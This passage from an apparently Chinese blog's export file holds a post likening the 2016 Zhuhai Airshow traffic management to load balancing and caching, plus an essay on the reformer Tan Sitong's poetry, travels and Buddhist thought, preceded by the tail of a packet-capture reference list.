<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港警务处网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.devdungeon.com/content/packet-capture-injection-and-analysis-gopacket">(推荐)Packet Capture, Injection, and Analysis with Gopacket</a></li>
<li><a href="http://www.tcpdump.org/papers/bpf-usenix93.pdf">(推荐)The BSD Packet Filter:A New Architecture for User-level Packet Capture</a></li>
<li><a href="http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf">Programming with Libpcap - Sniffing the Network From Our Own Application </a></li>
<li><a href="https://docs.oracle.com/cd/E23824_01/html/821-1453/gexkw.html">docs.oracle:Monitoring Packet Transfers With the snoop Command</a></li>
<li><a href="http://www.freebuf.com/articles/web/85129.html">MOTS(Man-on-the-Side)：一种隐秘的攻击</a></li>
<li><a href="https://blog.fox-it.com/2015/04/20/deep-dive-into-quantum-insert/">(推荐)Deep dive into QUANTUM INSERT</a></li>
<li><a href="https://www.youtube.com/watch?v=JZDiQ6f_TRs">YouTube:Capturing with Wireshark’s tshark</a></li>
<li><a href="http://www.linuxjournal.com/content/using-tshark-watch-and-inspect-network-traffic">Using tshark to Watch and Inspect Network Traffic</a></li>
<li><a href="https://mp.weixin.qq.com/s/7pxG4EEliIXbOgO27unBTQ">tcpdump：理论、自动抓包及业务架构树的生成</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>网络协议</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>珠海航展交通管控实践</title>
    <url>/2016/11/20/Network-Traffic/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>工程案例</li>
</ul>
<span id="more"></span>
<p>从2008年算起，笔者已经参加了5届珠海航展。在过去的航展中，群众“吐槽”最多的就是航展期间的交通，笔者亲身经历过的几次，无论是公交还是私家车方式，都体会到了“机场航展、路上车展”的拥堵悲壮感。</p>
<p>2016年珠海航展的交通状况却出奇的好，这引起了我的研究兴趣——按照Google SRE的理念，我们应该思考，自己的实践经验是否可以在其它行业复制，不同领域的成功实践是否能为我所借鉴学习。那么这次成功交通流量管控实践，是否可以为解决信息系统性能问题、架构设计优化提供借鉴思路呢？谨以此文，聊作记录。</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>展馆位于珠海市三灶机场。机场本身是在一个南面临海的半岛，展会期间的主要流量方向来自市区、珠三角城市群、外地经广深中转人群。主要的人、车流量会从北、东、西三个方面汇入，穿越市区，经过跨海大桥以及机场高速，进入珠海西部区域。如图所示：<br><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_01.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_02.png" alt=""></p>
<p>这是一个典型的流量突发峰值场景：<br>1、东部区域为主要流量入口，西部区域交通路网稀疏，对接容量不足；沿途多山靠海，地形地貌蜿蜒复杂，任意一点出现延时，会很快扩散，回旋空间小；<br>2、航展两年举办一次，每次一周。特别为此硬性扩容，经济性太差；<br>3、整个业务链条存在明显的薄弱环节：珠海大桥（珠海大道主干道单向4车道，辅道单向3车道，7条车道的车流集中汇集在珠海大桥上桥处，而珠海大桥单向只有3车道）；</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_030.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_04.png" alt=""></p>
<p>治理目标：<br>1、保障展会沿途交通线路通畅：即最大限度提升现有基础设施的通行效率，同时管控流量波动，防止超过预期的突发峰值；<br>2、提供弹性扩容能力，预留一定冗余容量，突发事件预案；<br>3、不能明显影响现有生产业务（城市功能仍需正常运转）。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="一、总量预算"><a href="#一、总量预算" class="headerlink" title="一、总量预算"></a>一、总量预算</h3><p>a) 公众日每天进场人数不超8万人<br>b)取消现场售票，提高展区周边通行效率，也防止无序流量；<br>c) 取消三日通票，按日售票，通过票务系统引导，分摊每日流量负荷。</p>
<p>最难的恐怕是测算。根据官方通报，主要由道路交通、餐饮等现场承载力测算，应该会参考往年的历史数据，旅行社市场调研情况，甚至可能是官网访问点击数据等。当然实际过程应该比较复杂，暂时没有一手信息，暂且掠过。</p>
<p>另外，技术上测算完了之后，也需要有人敢于为决策拍板。毕竟测算失误，是需要承担责任风险的，压力环境下如何决策是很值得研究的。总之，技术决策过程，都需要有一个人能下最后决心的。</p>
<h3 id="二、流量路径规划"><a href="#二、流量路径规划" class="headerlink" title="二、流量路径规划"></a>二、流量路径规划</h3><p>第一，优先保障航展核心区交通顺畅；<br>第二，设置外围停车场，实行小客车“P+R”停车换乘<br>第三，安排大运量公共交通接驳，减少核心展区交通压力；<br>第四，设置航展专用车道，保障公交、旅游包车等优先通行；<br>第五，最薄弱环节珠海大道启用同向红绿灯，增设导流实线。<br><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_06.png" alt=""></p>
<p>往届现场车辆大排长龙的景像今年没有出现，一路畅通。从技术上分析，上述方案能够取得明显效果，主要思路是一致的，即采用“负载均衡+缓存”机制，适当降低某些业务的优先级和时延，提升通行效率，保证整体可用性。具体表现为：</p>
<p><strong>1、负载均衡</strong><br>针对全线关键薄弱环节的瓶颈，将分流管制区放在珠海大桥之前，将大客车和自驾车流量分离，实际上起到了负载均衡的作用。负载均衡算法增加了大客车的优先权重，虽然会增加自驾车20分钟左右的绕行时间，但是保证了系统整体可用。比起大车小车挤成罐头的惨烈场景，这点损耗非常划算。</p>
<p>另外，在珠海大道开启二级负载均衡。主要措施：启用同向红绿灯，红绿灯口被重新划分为6个车道，每个车道会对应一个信号灯组，增设导流实线。限制加塞变道、不同方向车流抢道的现象发生。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_08.png" alt=""></p>
<p><strong>2、缓存机制</strong></p>
<p>一级缓存：自驾车换乘区。将小型自驾车引导进入附近的换乘停车场，而不是直接驶入核心区，中间调用大客车接驳。减少核心区的空间压力，也能聚拢零散客流。</p>
<p>二级缓存：核心区停车场。根据当时现场情况观察，展区周边的停车位经过统一规划，几乎没有乱停乱摆的情况发生。所有观展客流下车即进入验票口的蛇形验票队伍，出来即可换乘接驳大巴，团进团出，不会存在以往核心区滞留人群混乱的局面。</p>
<p><strong>3、实时监控能力升级</strong></p>
<p>例如 <strong>无人机：</strong>：使用无人机监控道路、停车场地等，提供更灵活的巡逻方式，扩大巡逻覆盖面。既缓解警力不足问题，也减少监控死角，对于潜在违规驾驶人也有一定震慑作用，有利于规范道路行车秩序。</p>
<p><strong>高德地图</strong>：当地警方与高德地图合作，航展期间将联合运营实现出行道路交通管制信息和场馆周边停车场、换乘点等信息的实时发布，引导观众避开拥堵路段。<br>此外，<strong>出租车GPS可视化系统</strong>、高配置的警用摩托车等装备也有一定特色。</p>
<p>上述方案能够落实到位，我相信是与大量引用新型技术密不可分的。<br><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_09.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_12.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Traffic_Question_ZH2016_11.png" alt=""></p>
<h2 id="2016珠海航展图集"><a href="#2016珠海航展图集" class="headerlink" title="2016珠海航展图集"></a>2016珠海航展图集</h2><ul>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 中国八一飞行表演队</a></li>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队</a></li>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 英国皇家空军红箭飞行表演队</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://zhangyi.farbox.com/post/architecture/traffic-jam-and-performance-tuning">张逸：交通堵塞与性能优化</a></li>
<li><a href="http://coolshell.cn/articles/17416.html">酷壳：缓存更新的套路</a></li>
<li>拥塞控制：排队理论，控制理论<a href="http://blog.csdn.net/dog250/article/details/72849985">Bomb250@排队系统拥塞控制的位置</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Engineering</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>最后的豪侠——谭嗣同</title>
    <url>/2017/04/20/MrTanSitong/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>第一部分 国士魂魄：走进谭嗣同的精神世界</li>
<li>一、沧海沙漠，千里关河：谭嗣同诗文鉴赏</li>
<li>二、菩萨救世，死得其所：谭嗣同的佛学思想及其影响</li>
<li>附录：谭嗣同年谱</li>
<li>附录：《仁学》摘要</li>
</ul>
<a id="more"></a>
<blockquote>
<p>二千年来之政，秦政也，皆大盗也；二千年来之学，荀学也，皆乡愿也。惟大盗利用乡愿，惟乡愿工媚大盗。<br>天下为君主囊橐中之私产，……其视华人之身家，曾弄具之不若。……吾愿华人，勿复梦梦谬引以为同类也。夫自西人视之，则早歧为二矣。<br>故俄报有云：华人苦到尽头处者，不下数兆。我当灭其朝而救其民。凡欧美诸国，无不为是言，皆将籍仗义之美名，阴以渔猎其资产。<br>“华人不自为之，其祸可胜言哉！”</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_theme_1.jpg" alt></p>
<p>谭嗣同（1865.3.10—1898.9.28）字复生，号壮飞，别署华相众生、东海褰冥氏、通眉生、廖天一阁主。湖南浏阳人。</p>
<h2 id="第一部分-国士魂魄：走进谭嗣同的精神世界"><a href="#第一部分-国士魂魄：走进谭嗣同的精神世界" class="headerlink" title="第一部分 国士魂魄：走进谭嗣同的精神世界"></a>第一部分 国士魂魄：走进谭嗣同的精神世界</h2><blockquote>
<p>望门投止思张俭，忍死须臾待杜根。<br>我自横刀向天笑，去留肝胆两昆仑。</p>
</blockquote>
<p>这首《狱中题壁》是谭嗣同的传世之作，是一首在狱中为自己写就的祭死之诗。生死去留坦然处之，烈士精神如同高耸的昆仑，傲视群伦。</p>
<p>在谭短暂的一生中留下不少诗歌、散文，颇有造诣，“今凡有《寥天一阁文》二卷，《莽苍苍斋诗》二卷，《远遗堂集外文初编》一卷，《续编》一卷，《石菊影庐笔识》二卷”。<br>谭嗣同早年游历南北山川名胜，他的诗歌以纪游和咏怀为主，多为咏物抒怀之作，境界恢弘，志趣豪迈，笔力遒劲。<br>散文方面，谭嗣同早期受桐城派影响，后学习龚自珍、魏源（《三十自纪》：“嗣同少颇为桐城所震，刻意规之数年”）。<br>这些留下的诗文作品可以说是在目前非常有限的资料中，了解谭嗣同精神世界的关键钥匙。</p>
<h3 id="一、谭嗣同诗文鉴赏"><a href="#一、谭嗣同诗文鉴赏" class="headerlink" title="一、谭嗣同诗文鉴赏"></a>一、谭嗣同诗文鉴赏</h3><h4 id="一个叛逆的官二代"><a href="#一个叛逆的官二代" class="headerlink" title="一个叛逆的官二代"></a>一个叛逆的官二代</h4><p>谭嗣同的父亲谭继洵（1823年－1901年）是考科举、进士出身的帝国官僚。作为一个传统官宦之家的公子，谭从小接受的也是儒家传统教育。<br>“五岁受书，即审四声，能属对。十五学诗，二十学文”，10岁时拜浏阳欧阳中鹄为师，23岁时在刘人熙的指导下开始研究 <strong>王夫之</strong> 等人的著作。</p>
<ul>
<li>《自题山水画扇》<blockquote>
<p>大石横冲雪浪粗，眼前突兀一峰孤。<br>悬知背面江山远，无画图中有画图。</p>
</blockquote>
</li>
</ul>
<p>如果套用精神分析学派的理论，谭嗣同的童年可谓是极度缺乏母爱的，这有可能是导致他一生处于悲苦忧郁心境的主要原因。生母徐五缘“性惠而肃”，这个评语为尊者忌，大概是比较凶的意思，除了不苟言笑之外，<br>每当孩子们稍有过失的时候，上来就打，“折操笞不少假贷”。谭嗣同11岁时，其母与一兄一姊染病身亡，之后就由谭继洵的妾卢氏照顾。按照谭自己的话说，备受后妈欺凌和虐待，父亲偏听偏信，”涵泳其苦，殆非生人所能任受!”，由此形成了非常怪癖的性格。</p>
<blockquote>
<p>“先夫人性惠而肃，训不肖等谆谆然，自一步一趋至植身接物，无不委曲详尽。又喜道往时贫苦事，使知衣食之不易。居平正襟危坐，略不倾倚，或终日不一言笑。不肖等过失，折操笞不少假贷。故嗣同诵书，窃疑师说，以为父慈而母严也。御下整齐有法度，虽当时偶烦苦，积严惮之致，实阴纳之于无过之地，以全其所事。—— 《先妣徐夫人逸事状》</p>
<p>“吾自少至壮，偏遭纲纶之厄，涵泳其苦，殆非生人所能任受，濒死累矣而卒不死；由是益轻其生命，以为块然躯壳，除利人之外，复何足惜。” —— 《仁学·自叙》</p>
</blockquote>
<p>由于不能在家庭中获得关爱，谭嗣同从小就有离家出走、四处游荡的记录。谭嗣同尤其喜好“壮游”，据我考证是中国近现代最有成就的“驴友”。<br>他有一次仗剑策马射猎，7昼夜行程1700多里，虽遇“髀肉狼藉”，但仍然“怡然自乐”。谭嗣同短暂的一生先后往来于疆、陇、秦、直、豫、鄂、湘、苏、赣等省，考察风土人情，结交名士（主要也就是官宦世家的公子哥以及文人学者），很多材料显示其中也包括大量的“江湖边缘人士”：和尚道士、绿林侠客、黑社会大哥等。<br>其中比较有名的便是大刀王五（1844年－1900年），祖籍河北沧州，回族，绰号“小五子”，善用大刀，拥有自己的镖局事业，是华北有名的江湖大哥、社团领导。由于长期深入社会各个阶层，实地走过荒野村镇，谭嗣同对于当时的深刻社会危机是有直观认识的，才能发出“风景不殊，山河顿异；城郭犹是，人民复非”的感慨。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_LanDengZhao.png" alt></p>
<ul>
<li><p>《罂粟米囊谣》</p>
<blockquote>
<p>罂无粟，囊无米，室如悬磬饥欲死。<br>饥欲死，且莫理，米囊可疗饥，<strong>罂粟栽千里。</strong><br>非米非粟，<strong>苍生病矣！</strong></p>
</blockquote>
</li>
<li><p>《宋徽宗画鹰》</p>
<blockquote>
<p>落日平原拍手呼，画中神骏世非无。<br>当年狐兔纵横甚，只少台臣似郅都。</p>
</blockquote>
</li>
<li><p>《望海潮自题小影》</p>
<blockquote>
<p>曾经沧海，又来沙漠，四千里外关河。骨相空谈，肠轮自转，回头十八年过。<br>春梦醒来么？对春帆细雨，独自吟哦。惟有瓶花，数枝相伴不须多。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>寒江才脱渔蓑。剩风尘面貌，自看如何？鉴不因人，形还问影，岂缘醉后颜酡？<br>拔剑欲高歌。<strong>有几根侠骨，禁得揉搓。</strong> 忽说此人是我，睁眼细瞧科。</p>
</blockquote>
<h4 id="谭嗣同的主要游历路线"><a href="#谭嗣同的主要游历路线" class="headerlink" title="谭嗣同的主要游历路线"></a>谭嗣同的主要游历路线</h4><p>主要的游历路线有三条，基本上相当于环绕大半个中国一圈：</p>
<ol>
<li>湖南&lt;——&gt;甘肃：沿途经过长沙、洞庭湖、湖北襄阳、河南洛阳，经潼关入陕西，到达甘肃兰州、天水一带。(回程不走潼关，借道汉中走水路到襄阳)</li>
<li>湖南&lt;——&gt;北京：京师出发，由天津出海，经停烟台一路海船到上海，通过江苏进入长江水道，经过安徽入湖北、洞庭湖，回到湖南。（来去大致原路）</li>
<li>甘肃&lt;——&gt;北京：兰州出发，穿过六盘山脉（崆峒山），经潼关出陕西入山西，到达直隶通州，入京师。</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_Map_20170917.png" alt></p>
<p>分析这些路线不难发现，有几个关键节点：浏阳-长沙、北京、南京、兰州。</p>
<p>家乡浏阳自不必说，谭继洵在北京户部任职十七年，有大量的社会关系，外放之后也需要经常到北京述职。<br>南京是江南科考的中心，虽然谭嗣同极度鄙视举业，还是参加了六次考试，当然了一次也没考中过。按照帝国的惯例，这类省部级高干的即使不参加科举，也是有很多门路的 —— 例如花钱捐官方面有一定的优先权。1896年（光绪二十二年），31岁的谭嗣同捐了一个知府的官衔，开始在江苏南京上班。显然这个候补官没啥事干，他的主要精力都是闭门读书，写作《仁学》。</p>
<blockquote>
<p>（光绪）三年冬，归湖南，取道天津，浮海径烟台至上海…溯江泛洞庭…抵浏阳。四年春，赴甘肃，舟至长沙，易舟流湘泛洞庭，流江径湖北，溯汉至襄阳，陆径洛阳入函谷、潼关至陕西。秋，至兰州，回抵秦州。<br>五年夏，归湖南，取道徽县，流嘉陵江至略阳，陆至汉中，流汉至襄阳，易舟仍流汉径湖北，溯江泛洞庭。秋，至长沙，陆抵浏阳。七年秋，游长沙。八年春，赴甘肃赴兰州，冬返。九年春，赴兰州。<br>十一年春，归湖南。夏，陆抵浏阳。秋，赴长沙，寻归。十一年冬，赴甘肃。十二年春，抵兰州。十四年夏，归湖南浏阳。秋赴长沙，寻归。冬，赴甘肃。</p>
<p>十五年春，抵兰州，寻上京师，径陕西，出潼关，渡河径山西，夏抵京师，寻归湖南，同三年。秋，抵浏阳。<br>十六年春，赴湖北，舟至长沙，易舟流湘泛洞庭，流江抵湖北。夏，归湖南。秋返，赴安徽，流江径九江抵安徽，寻返。<br>十七年秋，归湖南，抵长沙，游 <strong>衡岳</strong>，冬返。十九年春，赴芜湖，流江径九江、安徽抵芜湖，寻返。<br>夏，上京师，流江径九江、安徽、江苏至上海，<strong>易舟浮海，径烟台至天津</strong>，又易舟溯潞至北通州，陆抵京师。<br>秋，返湖北，取道天津，浮海径烟台至上海，易舟溯江，径江苏至安徽，易舟仍溯江，径九江抵湖北。</p>
</blockquote>
<p>谭继洵自光绪三年(1877年)由户部京官外巩秦阶道员开始，历任按察使、布政使，到光绪十五年(1889年)升任湖北巡抚为止，有长达12年时间在甘肃任职。这期间谭嗣同都是随侍身边的，他为了办理各项事务或者纯粹就是不想在家里待着，多次长途往返于“湖南浏阳-甘肃兰州”一线。《六盘山》、《崆峒》、《武昌夜泊》等作品都是写于这条路线，也是“曾经沧海，又来沙漠，四千里外关河”的由来。</p>
<ul>
<li><p>《潼关》</p>
<blockquote>
<p>终古高云簇此城，秋风吹散马啼声。<br>河流大野犹嫌束，山入潼关不解平。</p>
</blockquote>
</li>
<li><p>《六盘山》</p>
<blockquote>
<p>转饷谣马足蹩，车轴折。人蹉跌，山岌。朔雁一声天雨雪。<br>舆夫舆夫，尔勿嗔官。仅用尔力，尔胡不肯竭？<br>尔不思车中累累物，东南万户之膏血。<br>呜呼车中累累物，东南万户之膏血！</p>
</blockquote>
</li>
<li><p>《崆峒》</p>
<blockquote>
<p>高被众峰吞，莽荡山河剑气昏。<br>隔断尘寰云似海，划开天路岭为门。<br>松拿霄汉来龙斗，石负苔衣挟兽奔。<br>四望桃花红满谷，不应仍问武陵源。</p>
</blockquote>
</li>
<li><p>《秦岭》</p>
<blockquote>
<p>秦岭奔放竞东走，大气莽莽青嵯峨。<br>至此一束截然止，狂澜欲倒回其波。<br>百二奇险一岭扼，如马注坂勒于坡。<br>蓝水在右丹在左，中分星野凌天河。<br>唐昌黎伯伯曰愈，雪中偃蹇曾经过。<br>于今破庙兀千载，岁时尊俎祠岩阿。<br>关中之游已四度，往来登此常悲歌。<br>仰公遗像慕厥德，谓钝可厉顽可磨。<br>由汉迄唐道谁寄，董生与公余无它。<br>公之文章若云汉，昭回天地光羲娥。<br>文生于道道乃本，后有作者皆枝柯。<br>惟文惟道日趋下，赖公崛起蠲沉疴。<br>我昔刻厉蹑前躅，百追不及理则何。<br>才疏力薄固应尔，就令有得必坎坷。<br>观公所造岂不善，犹然举世相讥诃。<br>是知白璧不可为，使我奇气难英多。<br>便欲从军弃文事，请缨转战肠堪拖。<br>誓向沙场为鬼雄，庶展怀抱无蹉跎。<br>生平渴慕矍铄翁，马革一语心渐摩。<br>非曰发肤有弗爱，涓埃求补邦之讹。<br>班超素恶文墨吏，良以无益徒烦苛。<br>谨再拜公与公别，束卷不复事吟哦。<br>短衣长剑入秦去，乱峰河涌森如戈。</p>
</blockquote>
</li>
<li><p>《夜泊》</p>
<blockquote>
<p>系缆北风劲，五更荒岸舟。<br>戍楼孤角语，残腊异乡愁。<br>月晕山如睡，霜寒江不流。<br>窅然万物静，而我独何求？</p>
</blockquote>
</li>
<li><p>《武昌夜泊二篇》</p>
<blockquote>
<p>秋老夜苍苍，鸡鸣天雨霜。<br>星河千里白，鼓角一城凉。<br>灯炫新番舶，磷啼旧战场。<br>青山终不改，人事费兴亡。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>武汉烽销日，舟因览胜停。<br>江空能受月，树远不藏星。<br>露草逼蛩语，霜花凋雁翎。<br>但忧悬磬窒，兵气寓无形。</p>
</blockquote>
<h2 id="二、菩萨救世，死得其所：谭嗣同的佛学思想及其影响"><a href="#二、菩萨救世，死得其所：谭嗣同的佛学思想及其影响" class="headerlink" title="二、菩萨救世，死得其所：谭嗣同的佛学思想及其影响"></a>二、菩萨救世，死得其所：谭嗣同的佛学思想及其影响</h2><p>谭嗣同一生博通群学，融会诸宗，最后于佛教情有独钟。</p>
<h4 id="金陵听法"><a href="#金陵听法" class="headerlink" title="金陵听法"></a>金陵听法</h4><p>1896年（光绪二十二年），谭嗣同于京城结识了吴雁舟、夏曾佑、吴季清等人，倾心于佛学；同年夏，在南京认识清朝末年著名佛教居士杨文会，从杨文会学佛。</p>
<blockquote>
<p>“吴雁舟先生嘉瑞为余学佛第一导师，杨仁山先生为第二导师，乃大会于金陵，说甚深微妙之义，得未曾有。”</p>
</blockquote>
<ul>
<li>《金陵听说法》<blockquote>
<p>而为上首普观察，承佛威神说偈言。<br>一任法田卖人子，独从性海救灵魂。<br>纲伦惨以喀私德，法令盛于巴力门。<br>大地山河今领取，庵摩罗果掌中论。</p>
</blockquote>
</li>
</ul>
<p>杨仁山（1837年－1911年），名文会，字仁山，安徽石埭（今安徽池州石台）人。创立金陵刻经处、祇洹精舍（中国第一所现代化的佛学教育机构），被尊称为“近代中国佛教复兴之父”。</p>
<p>杨仁山出身官宦世家。其父杨朴庵，与曾国藩是同年的进士，但是杨自小不喜欢举业，太平天国之乱时，曾襄助曾国藩办理军粮事务，精于工程事业，但不愿为官，曾国藩、李鸿章“咸以国士目之”，后服职于江宁筹防局。亦曾受聘曾纪泽幕府，随曾纪泽出使欧洲，随刘芝田出使英法。同治年间，杨仁山移居杭州时，曾想娶一名杭州女子为妻，但受到母亲及正室的反对，只同意让他纳为妾，遂作罢。经此事后，杨终日闷闷不乐，在杭州书店中见到《大乘起信论》，大为激赏，从此嗜读佛教经典，开始他的佛教事业。</p>
<p>虽然跟从杨文会学习的时间不长，总计不过一年有余，但是深刻地影响了谭嗣同的精神世界。他有段时间就住在金陵刻经处勤学苦修，“于是重发大愿，昼夜精持佛咒，少不间断”。杨仁山的核心思想在于对于佛教圆融精神的把握，对于净土宗、华严宗和唯识宗三者都加以强调， 谭嗣同后来“成一家之言” —— 将华严、唯识二宗的佛学思想融入了《仁学》的理论框架，体现了极高的造诣。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_Dao.png" alt></p>
<h4 id="救众生外无佛法"><a href="#救众生外无佛法" class="headerlink" title="救众生外无佛法"></a>救众生外无佛法</h4><p>千百年来以来，号称大乘的中国佛教，其实深锁于围墙之内、象牙塔中，多落于清谈、空谈，大众眼中是一种出世、消极、与社会脱离的形象。天下处于“千年未有之大变局”的严峻时刻，内忧外患，黎民苍生流离失所，佛陀的“慈悲”、“众生平等”，大乘的救度众生，体现在哪些佛教徒身上呢？。举目所望，诚令人大失所望。谭嗣同认为佛教积极入世、普渡众生的精神与“孔孟救世之深心”是一致的，决心以佛法世法、经世致用，<strong>“救人之外无事功，即度众生之外无佛法”</strong>。</p>
<blockquote>
<p>“佛说以无畏为主，已成德者名大无畏，教人也名施无畏，而无畏之源出于慈悲，故为度一切众生故，无不活畏，无恶名畏，无死畏，无地狱恶道畏，乃至无大众威德畏，盖仁之至矣。”——写给欧阳中鹄的信</p>
<p>“我之一身，何可私之有？ 何可爱之有？既可无私，既可无爱，则毋宁舍其身以为众生之牺牲，以行吾心之所安。” —— 《仁学·自叙》</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_Hot.png" alt></p>
<p>正是在这种精神的指引之下，谭嗣同会最终选择舍生取义、杀身成仁、为社会革命而慷慨就义，可以说是为了实践其舍身救世的大无畏精神而得偿所愿。“善学佛者，未有不震动奋勇而雄强刚猛者也”。大乘佛法走出围墙，在人间重现其刚健雄猛的精神，佛教在整个中国近代的面貌为之一变。</p>
<blockquote>
<p>“不有行者，无以图将来，不有死者，无以召后起。”<br>“各国变法无不从流血而成，今日中国未闻有因变法而流血者，此国之所以不昌也。有之，请自嗣同始。”</p>
</blockquote>
<p>谭嗣同就义十三年后，统治中国近三百年的王朝，沿用近二千年的帝国体制，轰然崩塌。</p>
<blockquote>
<p>“排除生死，旁若无人，布衣麻鞋，径行独往，上无政党猥贱之操，下无懦夫奋矜之气。” —— 章太炎 《答铁铮》</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_Mao_Yang.png" alt></p>
<h2 id="中学-vs-西学"><a href="#中学-vs-西学" class="headerlink" title="中学 vs 西学"></a>中学 vs 西学</h2><ul>
<li>《论学者不当骄人》</li>
</ul>
<p>动辄诋西人无伦常，此大不可。夫无伦常矣，安得有国？使无伦常而犹能至今日之治平强盛，则治国者又何必要伦常乎？<br>惟其万不能少，是以西人最讲究伦常，且更精而更实。即如民主、君民共主，岂非伦常中之大公者乎？<br>又如西人招民兵，有独子留养之例，又最重居丧之礼，岂得谓其无父子乎？<br>西人自命为一夫一妻世界，绝无置妾之事，岂非夫妇一伦之至正者乎？<br>何得动诋西人无伦常？即令伦常中之礼文小有不同，要不过是末节耳，不妨各安其风俗，无所用其诋也，无所用其骄也。<br>况伦常者，人人当尽之分，纵令做到极处，亦不过是分内之事，并算不得甚么本事；何得持此以骄人乎？</p>
<h2 id="血著《仁学》"><a href="#血著《仁学》" class="headerlink" title="血著《仁学》"></a>血著《仁学》</h2><h4 id="二十一"><a href="#二十一" class="headerlink" title="二十一"></a>二十一</h4><p>难者又曰：“机器兴，物产饶，物价宜廉矣，而欧、美反贵者，何也？”<br>曰：此机器之所以利民也。小民穷岁月之力，拮据辛劳，以成一物，岂不欲多得值哉？而价止于此，此其可哀甚矣。盖物价之贵贱，隐视民命之重轻以为衡。治化隆美之世，民皆丰乐充裕，爱惜生命，不肯多用人力，人亦从而爱惜之焉，故创造一物，即因其力之可贵而贵之。苟或不贵，固不急求售，亦将不复造。且民皆富矣，虽多出值复何吝？…… 中国之民，至鬻其身以为奴隶，驱使若犬羊，系役若重囚，… 身且如此，更何论所造之物？此所以虽贱极犹莫能售也。<br><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_people.jpg" alt></p>
<h4 id="三十三"><a href="#三十三" class="headerlink" title="三十三"></a>三十三</h4><p>天下为君主囊橐中之私产，不始今日，固数千年以来矣。峻死灰复燃之防，为盗憎主人之计，锢其耳目，桎其手足，压制其心思，绝其利源，窘其生计，塞蔽其智术；繁拜跪之仪以挫其气节，而士大夫之才窘矣；立著书之禁以缄其口说，而文字之祸烈矣；且即挟此士所崇之孔教，缘饰皮傅，以愚其人，而为藏身之固。</p>
<h4 id="三十六"><a href="#三十六" class="headerlink" title="三十六"></a>三十六</h4><p>中国之兵，固不足以御外侮，而自屠割其民则有余。自屠割其民，而方受大爵，膺大赏，享大名， 瞷然骄居，自以为大功者，此吾所以至耻恶湘军不须臾忘也。虽然，彼为兵者，亦可谓大愚矣。月得饷银三两余，营官又从而减蚀之，所余无几……养之如彼其薄，责之如此其厚，自非丧心病狂，生而大愚者，孰能任为兵矣？</p>
<h4 id="四十三"><a href="#四十三" class="headerlink" title="四十三"></a>四十三</h4><p>夫心力最大者，无不可为。惟其大也，又适以召阻险：格致盛而愈多难穷之理，…… 医学盛而愈多难治之症，算学盛而愈多难取之题，治理盛而愈多难防之弊。道高一尺，魔高一丈，愈进愈阻，永无止息。然反而观之，向使不进，乃并此阻而不可得。…… 苟畏难而偷安，防害而不敢兴利，动援西国 <strong>民党之不靖</strong>，而谓不当学西法，不知正其治化日进之凭据也。即有小乱，当统千万年之全局观之，徒童窥于一孔，谓头痛医头，腹痛当医腹，遂弃置全局于不顾，此其心力，诚不足道矣！……<br>各教教主，皆自匹夫一意孤行而创之者也。盖心力之实体，莫大于慈悲。慈悲则我视人平等，而我以无畏；人视我平等，而人亦以无畏。无畏则无所用机矣。…… 无畏有五，曰：<br>无死畏，<br>无恶名畏，<br>无不活畏，<br>无恶道畏，<br>乃至无大众威德畏。<br>(注：初学之菩萨，有五怖畏：一、不活畏，行布施者，恐己不能过活，而不能尽所有。二、恶名畏，恐已恶名，不能为和光同尘之行。三、死畏，虽发广大之心，然恐死而不能舍身命。四、恶道畏，恐己堕于恶道，而对治不善法。五、大众咸德畏，恐众多之人或威德之人，不能于其前为狮子吼。)<br><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_theme_2.jpg" alt></p>
